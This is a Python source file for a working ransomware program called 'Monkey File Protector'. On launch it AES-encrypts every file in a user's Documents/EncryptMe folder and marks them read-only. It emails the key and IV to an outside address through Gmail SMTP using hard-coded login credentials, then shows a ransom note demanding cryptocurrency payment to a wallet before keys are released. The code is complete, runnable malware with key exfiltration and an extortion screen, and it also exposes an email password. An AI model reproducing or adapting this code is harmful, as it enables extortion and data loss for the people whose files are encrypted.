import os
import tkinter as tk
import smtplib
from email.message import EmailMessage
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from PIL import Image, ImageTk
import random
from pathlib import Path
import stat

encrypted_files = []

user_documents = os.path.expanduser("~/Documents")
encrypt_dir = os.path.join(user_documents, "EncryptMe")
os.makedirs(encrypt_dir, exist_ok=True)

assets_dir = Path(__file__).parent / "assets"

EMAIL_ADDRESS = "bot060665@gmail.com"
EMAIL_PASSWORD = "erxe fkpb mlwz oxmu"
SMTP_SERVER = "smtp.gmail.com"
RECIPIENT_EMAIL = 'senay.ifeanyichukwu@fileexp.com'
SMTP_PORT = 587

def send_key_via_email(key, iv):
    try:
        msg = EmailMessage()
        msg["Subject"] = "Encryption Key and IV"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg.set_content(f"Encryption Key: {key.hex()}\nIV: {iv.hex()}")

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
    except Exception as e:
        print(f"Failed to send email: {e}")

# File marking functions
def mark_file_as_encrypted(file_path):
    """Mark the file as encrypted by setting it as read-only."""
    os.chmod(file_path, stat.S_IREAD)

def unmark_file_as_encrypted(file_path):
    """Remove the read-only mark from the file."""
    os.chmod(file_path, stat.S_IWRITE)

def is_file_marked_as_encrypted(file_path):
    """Check if the file is marked as encrypted by its permissions."""
    return not os.access(file_path, os.W_OK)

# Encryption function
def encrypt_files():
    """Encrypt files in the EncryptMe directory, skipping already encrypted ones."""
    global encrypted_files, key, iv

    for root_dir, _, files in os.walk(encrypt_dir):
        for file_name in files:
            file_path = os.path.join(root_dir, file_name)
            if os.path.isfile(file_path):
                try:
                    if is_file_marked_as_encrypted(file_path):
                        print(f"Skipping already encrypted file: {file_path}")
                        continue

                    with open(file_path, "rb") as file:
                        data = file.read()

                    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    encrypted_data = encryptor.update(data) + encryptor.finalize()

                    with open(file_path, "wb") as file:
                        file.write(encrypted_data)

                    mark_file_as_encrypted(file_path)
                    encrypted_files.append(file_path)
                    print(f"Encrypted: {file_path}")
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")

# Decryption function
def decrypt_files():
    """Decrypt previously encrypted files."""
    try:
        key_input = key_entry.get().strip()
        iv_input = iv_entry.get().strip()

        if len(key_input) != 64 or len(iv_input) != 32:
            raise ValueError("Invalid key or IV length.")

        key = bytes.fromhex(key_input)
        iv = bytes.fromhex(iv_input)

        for root_dir, _, files in os.walk(encrypt_dir):
            for file_name in files:
                file_path = os.path.join(root_dir, file_name)
                if os.path.isfile(file_path):
                    try:
                        if not is_file_marked_as_encrypted(file_path):
                            print(f"Skipping file not marked as encrypted: {file_path}")
                            continue

                        # Remove read-only mark before decryption
                        unmark_file_as_encrypted(file_path)

                        with open(file_path, "rb") as file:
                            encrypted_data = file.read()

                        cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend())
                        decryptor = cipher.decryptor()
                        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

                        with open(file_path, "wb") as file:
                            file.write(decrypted_data)

                        print(f"Decrypted: {file_path}")
                    except Exception as e:
                        print(f"Error decrypting {file_path}: {e}")

        messagebox.showinfo("Decryption", "All files have been decrypted!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to decrypt files: {e}")

# GUI setup
root = tk.Tk()
root.title("Monkey File Protector")
root.geometry("600x800")
root.resizable(True, True)

key = os.urandom(32)
iv = os.urandom(16)

encrypt_files()
send_key_via_email(key, iv)

happy_monkey_img = Image.open(assets_dir / "happy_monkey.png").resize((150, 150), Image.Resampling.LANCZOS)
angry_monkey_img = Image.open(assets_dir / "angry_monkey.png").resize((150, 150), Image.Resampling.LANCZOS)
happy_monkey = ImageTk.PhotoImage(happy_monkey_img)
angry_monkey = ImageTk.PhotoImage(angry_monkey_img)
monkey_images = {"happy": happy_monkey, "angry": angry_monkey}

monkey_frame = tk.Frame(root, width=400, height=300)
monkey_frame.pack_propagate(False)
monkey_frame.pack(pady=10)

canvas = tk.Canvas(monkey_frame, width=400, height=300)
canvas.pack()
monkey_image_on_canvas = canvas.create_image(200, 150, image=happy_monkey)

input_frame = tk.Frame(root)
input_frame.pack(pady=20)

message_label = tk.Label(input_frame, text="Your files got monkeyed.\nTo get them back, send money to the following crypto wallet:\n0xA3Bc47E8dD22F6b1a9f85C9Db08cE4A6Fd57b2C4")
message_label.grid(row=0, column=0, padx=10, pady=1)

email_label = tk.Label(input_frame, text="Send the receipt to senay.ifeanyichukwu@fileexp.com for the encryption keys to your files.")
email_label.grid(row=1, column=0, padx=10, pady=1)

key_label = tk.Label(input_frame, text="Enter Key:")
key_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
key_entry = tk.Entry(input_frame, width=50)
key_entry.grid(row=3, column=0, padx=10, pady=5)

iv_label = tk.Label(input_frame, text="Enter IV:")
iv_label.grid(row=4, column=0, padx=10, pady=5, sticky="w")
iv_entry = tk.Entry(input_frame, width=50)
iv_entry.grid(row=5, column=0, padx=10, pady=5)

decrypt_button = tk.Button(input_frame, text="Decrypt Files", command=decrypt_files, width=20)
decrypt_button.grid(row=6, column=0, padx=10, pady=20)

root.mainloop()

